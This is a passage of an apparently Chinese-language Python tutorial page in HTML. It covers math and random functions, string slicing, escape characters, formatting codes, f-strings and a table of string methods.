tan(math.pi/4) :  0.9999999999999999</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"degrees(math.pi/4) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>degrees<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi <span class=\"token operator\">/</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># degrees(math.pi/4) :  45.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>radians<span class=\"token punctuation\">(</span><span class=\"token number\">180</span> <span class=\"token operator\">/</span> math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 3.141592653589793</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2.718281828459045</span>\n<span class=\"token triple-quoted-string string\">'''\nabs(-40) :  40\nmath.ceil(-45.17) :  -45\n1\nmath.exp(-45.17) :  2.4150062132629406e-20\nmath.fabs(-45.17) :  45.17\nmath.floor(-45.17) :  -46\nmath.log(100.12) :  4.6063694665635735\nmath.log10(100.12) :  2.0005208409361854\nmax(80, 100, 1000) :  1000\nmin(80, 100, 1000) :  80\nmath.modf(100.12) :  (0.12000000000000455, 100.0)\nmath.pow(100, 2) :  10000.0\npow(100, 2) :  10000\nround(-100.000056, 3) :  -100.0\nmath.sqrt(100) :  10.0\n从 range(100) 返回一个随机数 :  22\n从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  2\n从字符串中 'Runoob' 返回一个随机字符 :  R\nrandrange(1,100, 2) :  83\nrandrange(100) :  92\nrandom() :  0.2392758950765237\nrandom() :  0.7016096413249141\n随机排序列表 :  [16, 5, 20, 10]\n随机排序列表 :  [20, 16, 10, 5]\nuniform(5, 10) 的随机浮点数 :  9.96850739092334\nuniform(7, 14) 的随机浮点数 :  9.03188249118426\nacos(1) :  0.0\nasin(1) :  1.5707963267948966\natan(1) :  0.7853981633974483\natan2(10,20) :  0.4636476090008061\ncos(2*math.pi) :  1.0\nhypot(0, 2) :  2.0\nsin(math.pi/2) :  1.0\ntan(math.pi/4) :  0.9999999999999999\ndegrees(math.pi/4) :  45.0\n1.0\n3.141592653589793\n2.718281828459045\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"字符串-String\"><a href=\"#字符串-String\" class=\"headerlink\" title=\"字符串(String)\"></a>字符串(String)</h2><h3 id=\"字符串截取格式-1\"><a href=\"#字符串截取格式-1\" class=\"headerlink\" title=\"字符串截取格式\"></a>字符串截取格式</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">变量名<span class=\"token punctuation\">[</span>头下标<span class=\"token punctuation\">:</span>尾下标<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从前面索引  0 1 2 3 4 ……</p>\n<p>从后面索引  -1 -2 -3 -4 -5 ……</p>\n<p>从前面截取 :1 2 3 4:</p>\n<p>从后面截取 :-4 -3 -2 -1:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 创建字符串</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># t</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有字符</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第一个到倒数第二个</span>\n<span class=\"token comment\"># tes</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第三个到第四个</span>\n<span class=\"token comment\"># st</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># testtest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span> <span class=\"token operator\">+</span> <span class=\"token string\">'re'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># testre</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># t t</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">' '</span> <span class=\"token operator\">+</span> <span class=\"token string\">'restart'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># te restart</span>\n<span class=\"token comment\"># 截取再拼接</span>\n\n<span class=\"token triple-quoted-string string\">'''\ntest\nt\ntest\ntes\nst\ntesttest\ntestre\nt t\nte restart\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>python字符串不能改变，诸如<code>str[n]='?'</code>的赋值会报错</p>\n<h3 id=\"转义字符\"><a href=\"#转义字符\" class=\"headerlink\" title=\"转义字符\"></a>转义字符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 转义字符</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span> \\\n      <span class=\"token operator\">+</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># \\续行</span>\n<span class=\"token comment\"># testtest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 反斜杠</span>\n<span class=\"token comment\"># \\</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\''</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 单引号</span>\n<span class=\"token comment\"># '</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\\"'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 双引号</span>\n<span class=\"token comment\"># \"</span>\n<span class=\"token comment\"># print('\\a')  # 响铃</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test \\btest'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 退格</span>\n<span class=\"token comment\"># testtest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\000'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 空</span>\n<span class=\"token comment\"># </span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1\\n1'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 换行</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test\\vtest'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 纵向制表符</span>\n<span class=\"token comment\">#test\u000btest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test\\ttest'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 横向制表符</span>\n<span class=\"token comment\"># test\ttest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test eee\\r11  33'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># \\r后面替换前面</span>\n<span class=\"token comment\"># 11  33</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test\\ftest'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 换页</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\666'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 8进制</span>\n<span class=\"token comment\"># z</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\x33'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 16进制</span>\n<span class=\"token comment\"># 3</span>\n<span class=\"token triple-quoted-string string\">'''\ntesttest\n\\\n'\n\"\ntesttest\n \n1\n1\ntest\u000btest\ntest\ttest\n11  33\ntest\ftest\nƶ\n3\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"运算符-1\"><a href=\"#运算符-1\" class=\"headerlink\" title=\"运算符\"></a>运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 运算符</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'rr'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 连接符</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 重复符</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引符</span>\n<span class=\"token comment\"># in not in 成员运算符</span>\na <span class=\"token operator\">=</span> <span class=\"token string\">'hahah'</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'a'</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'in'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"not in\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># %格式控制符</span>\n    \n<span class=\"token triple-quoted-string string\">'''\n2rr\ntesttest\ne\nin\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"字符格式化\"><a href=\"#字符格式化\" class=\"headerlink\" title=\"字符格式化\"></a>字符格式化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"我叫 %s 今年 %d 岁!\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#我叫 小明 今年 10 岁!</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">符  号</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">%c</td>\n<td align=\"left\">格式化字符及其ASCII码</td>\n</tr>\n<tr>\n<td align=\"left\">%s</td>\n<td align=\"left\">格式化字符串</td>\n</tr>\n<tr>\n<td align=\"left\">%d</td>\n<td align=\"left\">格式化整数</td>\n</tr>\n<tr>\n<td align=\"left\">%u</td>\n<td align=\"left\">格式化无符号整型</td>\n</tr>\n<tr>\n<td align=\"left\">%o</td>\n<td align=\"left\">格式化无符号八进制数</td>\n</tr>\n<tr>\n<td align=\"left\">%x</td>\n<td align=\"left\">格式化无符号十六进制数</td>\n</tr>\n<tr>\n<td align=\"left\">%X</td>\n<td align=\"left\">格式化无符号十六进制数（大写）</td>\n</tr>\n<tr>\n<td align=\"left\">%f</td>\n<td align=\"left\">格式化浮点数字，可指定小数点后的精度</td>\n</tr>\n<tr>\n<td align=\"left\">%e</td>\n<td align=\"left\">用科学计数法格式化浮点数</td>\n</tr>\n<tr>\n<td align=\"left\">%E</td>\n<td align=\"left\">作用同%e，用科学计数法格式化浮点数</td>\n</tr>\n<tr>\n<td align=\"left\">%g</td>\n<td align=\"left\">%f和%e的简写</td>\n</tr>\n<tr>\n<td align=\"left\">%G</td>\n<td align=\"left\">%f 和 %E 的简写</td>\n</tr>\n<tr>\n<td align=\"left\">%p</td>\n<td align=\"left\">用十六进制数格式化变量的地址</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"left\">符号</th>\n<th align=\"left\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">*</td>\n<td align=\"left\">定义宽度或者小数点精度</td>\n</tr>\n<tr>\n<td align=\"left\">-</td>\n<td align=\"left\">用做左对齐</td>\n</tr>\n<tr>\n<td align=\"left\">+</td>\n<td align=\"left\">在正数前面显示加号( + )</td>\n</tr>\n<tr>\n<td align=\"left\"><sp></sp></td>\n<td align=\"left\">在正数前面显示空格</td>\n</tr>\n<tr>\n<td align=\"left\">#</td>\n<td align=\"left\">在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td>\n</tr>\n<tr>\n<td align=\"left\">0</td>\n<td align=\"left\">显示的数字前面填充’0’而不是默认的空格</td>\n</tr>\n<tr>\n<td align=\"left\">%</td>\n<td align=\"left\">‘%%’输出一个单一的’%’</td>\n</tr>\n<tr>\n<td align=\"left\">(var)</td>\n<td align=\"left\">映射变量(字典参数)</td>\n</tr>\n<tr>\n<td align=\"left\">m.n.</td>\n<td align=\"left\">m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td>\n</tr>\n</tbody></table>\n<h3 id=\"三引号\"><a href=\"#三引号\" class=\"headerlink\" title=\"三引号\"></a>三引号</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 三引号</span>\npara_str <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">\"\"\"这是一个多行字符串的实例\n多行字符串可以使用制表符\nTAB ( \\t )。\n也可以使用换行符 [ \\n ]。\n\"\"\"</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>para_str<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 跨多行</span>\n\n<span class=\"token triple-quoted-string string\">'''\n这是一个多行字符串的实例\n多行字符串可以使用制表符\nTAB ( \t )。\n也可以使用换行符 [ \n ]。\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"f-string\"><a href=\"#f-string\" class=\"headerlink\" title=\"f-string\"></a>f-string</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># f-string</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f'Hello </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span>  <span class=\"token comment\"># 替换变量</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>         <span class=\"token comment\"># 使用表达式</span>\nw <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'str'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>w<span class=\"token punctuation\">[</span><span class=\"token string\">\"str\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>w<span class=\"token punctuation\">[</span><span class=\"token string\">\"var\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n3\ntest: var\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">方法及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-capitalize.html\">capitalize()</a> 将字符串的第一个字符转换为大写</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-center.html\">center(width, fillchar)</a> 返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-count.html\">count(str, beg= 0,end=len(string))</a> 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-decode.html\">bytes.decode(encoding=”utf-8”, errors=”strict”)</a> Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-encode.html\">encode(encoding=’UTF-8’,errors=’strict’)</a> 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-endswith.html\">endswith(suffix, beg=0, end=len(string))</a> 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-expandtabs.html\">expandtabs(tabsize=8)</a> 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-find.html\">find(str, beg=0, end=len(string))</a> 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-index.html\">index(str, beg=0, end=len(string))</a> 跟find()方法一样，只不过如果str不在字符串中会报一个异常。</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isalnum.html\">isalnum()</a> 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isalpha.html\">isalpha()</a> 如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isdigit.html\">isdigit()</a> 如果字符串只包含数字则返回 True 否则返回 False..</td>\n</tr>\n<tr>\n<td align=\"left\">13</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-islower.html\">islower()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">14</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isnumeric.html\">isnumeric()</a> 如果字符串中只包含数字字符，则返回 True，否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">15</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isspace.html\">isspace()</a> 如果字符串中只包含空白，则返回 True，否则返回 False.</td>\n</tr>\n<tr>\n<td align=\"left\">16</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-istitle.html\">istitle()</a> 如果字符串是标题化的(见 title())则返回 True，否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">17</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isupper.html\">isupper()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td>\n</tr>\n<tr>\n<td align=\"left\">18</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-join.html\">join(seq)</a> 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td>\n</tr>\n<tr>\n<td align=\"left\">19</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-len.html\">len(string)</a> 返回字符串长度</td>\n</tr>\n<tr>\n<td align=\"left\">20</td>\n<td align=\"left\">[ljust(width<a href=\"https://www.runoob.com/python3/python3-string-ljust.html\">, fillchar])</a> 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。</td>\n</tr>\n<tr>\n<td align=\"left\">21</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-lower.html\">lower()</a> 转换字符串中所有大写字符为小写.</td>\n</tr>\n<tr>\n<td align=\"left\">22</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-lstrip.html\">lstrip()</a> 截掉字符串左边的空格或指定字符。</td>\n</tr>\n<tr>\n<td align=\"left\">23</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-maketrans.html\">maketrans()</a> 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td>\n</tr>\n<tr>\n<td align=\"left\">24</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-max.html\">max(str)</a> 返回字符串 str 中最大的字母。</td>\n</tr>\n<tr>\n<td align=\"left\">25</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-min.html\">min(str)</a> 返回字符串 str 中最小的字母。</td>\n</tr>\n<tr>\n<td align=\"left\">26</td>\n<td align=\"left\">[replace(old, new <a href=\"https://www.runoob.com/python3/python3-string-replace.html\">, max])</a> 把 将字符串中的 old 替换成 new,如果 max 指定，则替换不超过 max 次。</td>\n</tr>\n<tr>\n<td align=\"left\">27</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-rfind.html\">rfind(str, beg=0,end=len(string))</a> 类似于 find()函数，不过是从右边开始查找.</td>\n</tr>\n<tr>\n<td align=\"left\">28</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-rindex.html\">rindex( str, beg=0, end=len(string))</a> 类似于 index()，不过是从右边开始.</td>\n</tr>\n<tr>\n<td align=\"left\">29</td>\n<td align=\"left\">[rjust(width,<a href=\"https://www.runoob.com/python3/python3-string-rjust.html\">, fillchar])</a> 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串</td>\n</tr>\n<tr>\n<td align=\"left\">30</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-rstrip.html\">rstrip()</a> 删除字符串末尾的空格或指定字符。</td>\n</tr>\n<tr>\n<td align=\"left\">31</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-split.html\">split(str=””, num=string.count(str))</a> 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</td>\n</tr>\n<tr>\n<td align=\"left\">32</td>\n<td align=\"left\">[splitlines(<a href=\"https://www.runoob.com/python3/python3-string-splitlines.html\">keepends])</a> 按照行(‘\\r’, ‘\\r\\n’, \\n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td>\n</tr>\n<tr>\n<td align=\"left\">33</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-startswith.html\">startswith(substr, beg=0,end=len(string))</a> 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td>\n</tr>\n<tr>\n<td align=\"left\">34</td>\n<td align=\"left\">[strip(<a href=\"https://www.runoob.com/python3/python3-string-strip.html\">chars])</a> 在字符串上执行 lstrip()和 rstrip()</td>\n</tr>\n<tr>\n<td align=\"left\">35</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-swapcase.html\">swapcase()</a> 将字符串中大写转换为小写，小写转换为大写</td>\n</tr>\n<tr>\n<td align=\"left\">36</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-title.html\">title()</a> 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td>\n</tr>\n<tr>\n<td align=\"left\">37</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-translate.html\">translate(table, deletechars=””)</a> 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中</td>\n</tr>\n<tr>\n<td align=\"left\">38</td>\n<td align=\"left\"><a 